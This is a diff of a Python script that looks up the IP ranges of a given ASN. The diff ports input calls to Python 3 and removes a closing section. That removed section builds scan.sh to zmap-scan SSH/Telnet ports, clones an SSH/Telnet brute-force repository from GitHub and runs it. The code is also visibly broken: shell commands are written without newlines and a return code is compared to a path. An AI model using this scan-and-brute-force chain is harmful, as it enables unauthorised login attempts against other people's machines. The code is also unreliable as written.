@@ -16,10 +16,10 @@ acsii = """
                                          """
 
 print(acsii)
-c = raw_input("Would you like to use a [s]ingle asn or [m]ultiple ASNs ")
+c = input("Would you like to use a [s]ingle asn or [m]ultiple ASNs ")
 if c == "m":
     print("Input filename")
-    fn = raw_input(">>>>> ")
+    fn = input(">>>>> ")
     fc = sum(1 for line in open(fn))
     os.system('clear')
     print(acsii)
@@ -27,7 +27,7 @@ if c == "m":
     print(a)
 elif c == "s":
     print("whats the ASN:")
-    asn = raw_input(">>>>> ")
+    asn = input(">>>>> ")
     fn = "ig.txt"
     fi = open(fn, "w")
     fi.write(asn)
@@ -61,32 +61,3 @@ count = 0
 num_lines = sum(1 for line in open(filen))
 zmapc.close()
 print(str(num_lines) + " ip ranges found")
-c2 = input("Would you like to run scan.sh? [y/n]")
-os.system("rm scan.sh")
-os.system("rm mfu.txt")
-scan = open("scan.sh", "a")
-scan.write("zmap -p 22-23 -w list.lst -o mfu.txt -B10M")
-if os.path.isfile('bruteforce.py'):
-	print("Files are installed")
-else:
-	scan.write("git clone https://github.com/dontbanmeplz/Telnet-and-SSH-Bruteforce")
-	scan.write("cd Telnet-and-SSH-Bruteforce")
-	scan.write("mv bruteforce.py ..")
-	scan.write("cd ..")
-	scan.write("python bruteforce.py")
-	scan.close()
-os.system("chmod 777 scan.sh")
-if c2 == "y":
-	os.system("./scan.sh")
-elif c2 == "n":
-	print("ok")
-if c == "s":
-    os.system("rm ig.txt")
-r = os.system("which zmap")
-if r == "/path/zmap":
-	print("zmap is installed")
-else:
-	print("zmap is not installed.")
-	print("installing zmap")
-	os.system("chmod 777 zmap")
-	os.system("./zmap")
